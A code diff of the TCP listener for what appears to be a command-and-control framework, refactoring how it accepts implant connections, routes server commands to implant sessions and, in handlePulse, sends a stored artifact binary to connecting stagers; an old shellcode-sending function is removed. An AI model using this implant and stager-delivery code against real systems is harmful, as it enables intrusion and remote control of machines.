@@ -2,224 +2,230 @@ package listener
 
 import (
 	"context"
-	"encoding/binary"
+	"errors"
 	"fmt"
 	"github.com/chainreactors/logs"
+	"github.com/chainreactors/malice-network/helper/consts"
+	"github.com/chainreactors/malice-network/helper/encoders"
 	"github.com/chainreactors/malice-network/helper/encoders/hash"
-	"github.com/chainreactors/malice-network/helper/packet"
+	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
+	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
+	"github.com/chainreactors/malice-network/helper/proto/services/listenerrpc"
 	"github.com/chainreactors/malice-network/helper/types"
-	"github.com/chainreactors/malice-network/proto/implant/implantpb"
-
-	"github.com/chainreactors/malice-network/proto/listener/lispb"
-	"github.com/chainreactors/malice-network/server/internal/configs"
+	"github.com/chainreactors/malice-network/helper/utils/peek"
+	"github.com/chainreactors/malice-network/server/internal/certutils"
 	"github.com/chainreactors/malice-network/server/internal/core"
-	"github.com/chainreactors/malice-network/server/listener/encryption"
-	"google.golang.org/grpc"
-	"google.golang.org/protobuf/proto"
+	"github.com/chainreactors/malice-network/server/internal/parser"
+	"io"
 	"net"
 )
 
-func StartTcpPipeline(conn *grpc.ClientConn, pipeline *lispb.Pipeline) (*TCPPipeline, error) {
+func NewTcpPipeline(rpc listenerrpc.ListenerRPCClient, pipeline *clientpb.Pipeline) (*TCPPipeline, error) {
 	tcp := pipeline.GetTcp()
+
 	pp := &TCPPipeline{
-		Name:   tcp.Name,
-		Port:   uint16(tcp.Port),
-		Host:   tcp.Host,
-		Enable: true,
-		TlsConfig: &configs.CertConfig{
-			Cert:   pipeline.GetTls().Cert,
-			Key:    pipeline.GetTls().Key,
-			Enable: pipeline.GetTls().Enable,
-		},
-		Encryption: &configs.EncryptionConfig{
-			Enable: pipeline.GetEncryption().Enable,
-			Type:   pipeline.GetEncryption().Type,
-			Key:    pipeline.GetEncryption().Key,
-		},
+		rpc:            rpc,
+		Name:           pipeline.Name,
+		Port:           uint16(tcp.Port),
+		Host:           tcp.Host,
+		Enable:         true,
+		PipelineConfig: core.FromProtobuf(pipeline),
 	}
-	err := pp.Start()
+	var err error
+	pp.parser, err = parser.NewParser(pp.Parser)
 	if err != nil {
 		return nil, err
 	}
-	forward, err := core.NewForward(conn, pp)
-	if err != nil {
-		return nil, err
-	}
-	core.Forwarders.Add(forward)
+
 	return pp, nil
 }
 
-func ToTcpConfig(pipeline *lispb.TCPPipeline, tls *lispb.TLS) *configs.TcpPipelineConfig {
-	return &configs.TcpPipelineConfig{
-		Name:   pipeline.Name,
-		Port:   uint16(pipeline.Port),
-		Host:   pipeline.Host,
-		Enable: true,
-		TlsConfig: &configs.TlsConfig{
-			Name:     fmt.Sprintf("%s_%v", pipeline.Name, uint16(pipeline.Port)),
-			Enable:   true,
-			CertFile: tls.Cert,
-			KeyFile:  tls.Key,
-		},
-	}
-}
-
 type TCPPipeline struct {
-	ln         net.Listener
-	Name       string
-	Port       uint16
-	Host       string
-	Enable     bool
-	TlsConfig  *configs.CertConfig
-	Encryption *configs.EncryptionConfig
+	ln     net.Listener
+	rpc    listenerrpc.ListenerRPCClient
+	Name   string
+	Port   uint16
+	Host   string
+	Enable bool
+	parser *parser.MessageParser
+	*core.PipelineConfig
 }
 
-func (l *TCPPipeline) ToProtobuf() proto.Message {
-	return &lispb.TCPPipeline{
-		Name: l.Name,
-		Port: uint32(l.Port),
-		Host: l.Host,
+func (pipeline *TCPPipeline) ToProtobuf() *clientpb.Pipeline {
+	p := &clientpb.Pipeline{
+		Name:       pipeline.Name,
+		Enable:     pipeline.Enable,
+		ListenerId: pipeline.ListenerID,
+		Body: &clientpb.Pipeline_Tcp{
+			Tcp: &clientpb.TCPPipeline{
+				Port: uint32(pipeline.Port),
+				Host: pipeline.Host,
+			},
+		},
+		Tls:        pipeline.Tls.ToProtobuf(),
+		Encryption: pipeline.Encryption.ToProtobuf(),
 	}
+	return p
 }
 
-func (l *TCPPipeline) ToTLSProtobuf() proto.Message {
-	return &lispb.TLS{
-		Cert: l.TlsConfig.Cert,
-		Key:  l.TlsConfig.Key,
-	}
-}
-func (l *TCPPipeline) ID() string {
-	return fmt.Sprintf(l.Name)
+func (pipeline *TCPPipeline) ID() string {
+	return pipeline.Name
 }
 
-func (l *TCPPipeline) Addr() string {
-	return ""
-}
-
-func (l *TCPPipeline) Close() error {
-	err := l.ln.Close()
+func (pipeline *TCPPipeline) Close() error {
+	pipeline.Enable = false
+	err := pipeline.ln.Close()
 	if err != nil {
 		return err
 	}
 	return nil
 }
 
-func (l *TCPPipeline) Start() error {
-	if !l.Enable {
+func (pipeline *TCPPipeline) Start() error {
+	if !pipeline.Enable {
 		return nil
 	}
-	var err error
-	l.ln, err = l.handler()
+	forward, err := core.NewForward(pipeline.rpc, pipeline)
 	if err != nil {
 		return err
 	}
+	forward.ListenerId = pipeline.ListenerID
+	core.Forwarders.Add(forward)
+	go func() {
+		// recv message from server and send to implant
+		defer logs.Log.Errorf("forwarder stream exit!!!")
+		for {
+			msg, err := forward.Stream.Recv()
+			if err != nil {
+				return
+			}
+			connect := core.Connections.Get(msg.Session.SessionId)
+			if connect == nil {
+				logs.Log.Errorf("connection %s not found", msg.Session.SessionId)
+				continue
+			}
+			connect.C <- msg
+		}
+	}()
+
+	pipeline.ln, err = pipeline.handler()
+	if err != nil {
+		return err
+	}
+	logs.Log.Infof("[pipeline] starting TCP pipeline on %s:%d, parser: %s, cryptor: %s, tls: %t",
+		pipeline.Host, pipeline.Port, pipeline.Parser, pipeline.Encryption.Type, pipeline.Tls.Enable)
 
 	return nil
 }
 
-func (l *TCPPipeline) handler() (net.Listener, error) {
-	logs.Log.Infof("Starting TCP listener on %s:%d", l.Host, l.Port)
-	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", l.Host, l.Port))
+func (pipeline *TCPPipeline) handler() (net.Listener, error) {
+	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", pipeline.Host, pipeline.Port))
 	if err != nil {
 		return nil, err
 	}
-	if l.TlsConfig != nil && l.TlsConfig.Enable {
-		ln, err = encryption.WrapWithTls(ln, l.TlsConfig)
+	if pipeline.Tls != nil && pipeline.Tls.Enable {
+		ln, err = certutils.WrapWithTls(ln, pipeline.Tls)
 		if err != nil {
 			return nil, err
 		}
 	}
 	go func() {
+		defer logs.Log.Errorf("tcp pipeline exit!!!")
 		for {
 			conn, err := ln.Accept()
 			if err != nil {
-				if errType, ok := err.(*net.OpError); ok && errType.Op == "accept" {
-					break
-				}
 				logs.Log.Errorf("Accept failed: %v", err)
-				continue
+				if !pipeline.Enable {
+					logs.Log.Importantf("%s already disable, break accept", ln.Addr().String())
+					return
+				} else {
+					continue
+				}
 			}
-			logs.Log.Debugf("accept from %s", conn.RemoteAddr())
-			go l.handleRead(l.wrapConn(conn))
+			logs.Log.Debugf("[pipeline.%s] accept from %s", pipeline.Name, conn.RemoteAddr())
+			switch pipeline.Parser {
+			case consts.ImplantMalefic:
+				go pipeline.handleBeacon(conn)
+			case consts.ImplantPulse:
+				go pipeline.handlePulse(conn)
+			}
+
 		}
 	}()
 	return ln, nil
 }
 
-func (l *TCPPipeline) handleRead(conn net.Conn) {
-	defer conn.Close()
+func (pipeline *TCPPipeline) handlePulse(conn net.Conn) {
+	peekConn, err := pipeline.WrapConn(conn)
+	if err != nil {
+		logs.Log.Debugf("wrap conn error: %s %v", conn.RemoteAddr(), err)
+		return
+	}
+	p := pipeline.parser
+	magic, artifactId, err := p.ReadHeader(peekConn)
+	if err != nil {
+		logs.Log.Errorf(err.Error())
+		return
+	}
+	builder, err := pipeline.rpc.GetArtifact(context.Background(), &clientpb.Artifact{
+		Id: uint32(artifactId),
+	})
+	if err != nil {
+		logs.Log.Errorf("not found artifact %d ,%s ", artifactId, err.Error())
+		return
+	} else {
+		logs.Log.Infof("send artifact %d %s", builder.Id, builder.Name)
+	}
+	err = p.WritePacket(peekConn, types.BuildOneSpites(&implantpb.Spite{
+		Name: consts.ModuleInit,
+		Body: &implantpb.Spite_Init{
+			Init: &implantpb.Init{Data: builder.Bin},
+		},
+	}), magic)
+	if err != nil {
+		logs.Log.Errorf(err.Error())
+		return
+	}
+}
 
-	var connect *core.Connection
+func (pipeline *TCPPipeline) handleBeacon(conn net.Conn) {
+	defer conn.Close()
+	peekConn, err := pipeline.WrapConn(conn)
+	if err != nil {
+		logs.Log.Debugf("wrap conn error: %s %v", conn.RemoteAddr(), err)
+		return
+	}
+	connect, err := pipeline.getConnection(peekConn)
+	if err != nil {
+		logs.Log.Debugf("peek read header error: %s %v", conn.RemoteAddr(), err)
+		return
+	}
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 	for {
-		var rawID []byte
-		var err error
-		var msg proto.Message
-		var length int
-		rawID, length, err = packet.ReadHeader(conn)
+		err = connect.Handler(ctx, peekConn)
 		if err != nil {
-			//logs.Log.Debugf("Error reading header: %s %v", conn.RemoteAddr(), err)
+			if !errors.Is(err, io.EOF) {
+				logs.Log.Debugf("handler error: %s", err.Error())
+			}
 			return
 		}
-		sid := hash.Md5Hash(rawID)
-		connect = core.Connections.Get(sid)
-		if connect == nil {
-			connect = core.NewConnection(rawID)
-		}
-
-		go connect.Send(ctx, conn)
-		if length != 0 {
-			msg, err = packet.ReadMessage(conn, length)
-			if err != nil {
-				logs.Log.Debugf("Error reading message:%s %v", conn.RemoteAddr(), err)
-				return
-			}
-		} else {
-			msg = types.BuildPingSpite()
-		}
-
-		core.Forwarders.Send(l.ID(), &core.Message{
-			Message:    msg,
-			SessionID:  hash.Md5Hash(rawID),
-			RemoteAddr: conn.RemoteAddr().String(),
-		})
 	}
 }
 
-func (l *TCPPipeline) handleWrite(conn net.Conn, ch chan *implantpb.Spites, rawid []byte) {
-	msg := <-ch
-	err := packet.WritePacket(conn, msg, rawid)
+func (pipeline *TCPPipeline) getConnection(conn *peek.Conn) (*core.Connection, error) {
+	p := pipeline.parser
+	sid, _, err := p.PeekHeader(conn)
 	if err != nil {
-		logs.Log.Debugf(err.Error())
-		ch <- msg
+		return nil, err
 	}
-	return
-}
 
-func (l *TCPPipeline) wrapConn(conn net.Conn) net.Conn {
-	if l.Encryption != nil && l.Encryption.Enable {
-		eConn, err := encryption.WrapWithEncryption(conn, []byte(l.Encryption.Key))
-		if err != nil {
-			return conn
-		}
-		return eConn
+	if newC := core.Connections.Get(hash.Md5Hash(encoders.Uint32ToBytes(sid))); newC != nil {
+		return newC, nil
+	} else {
+		newC := core.NewConnection(p, sid, pipeline.ID())
+		core.Connections.Add(newC)
+		return newC, nil
 	}
-	return conn
-}
-
-func handleShellcode(conn net.Conn, data []byte) {
-	logs.Log.Infof("Accepted incoming connection: %s", conn.RemoteAddr())
-	// Send shellcode size
-	dataSize := uint32(len(data))
-	lenBuf := make([]byte, 4)
-	binary.LittleEndian.PutUint32(lenBuf, dataSize)
-	logs.Log.Infof("Shellcode size: %d\n", dataSize)
-	final := append(lenBuf, data...)
-	logs.Log.Infof("Sending shellcode (%d)\n", len(final))
-	// Send shellcode
-	conn.Write(final)
-	// Closing connection
-	conn.Close()
 }
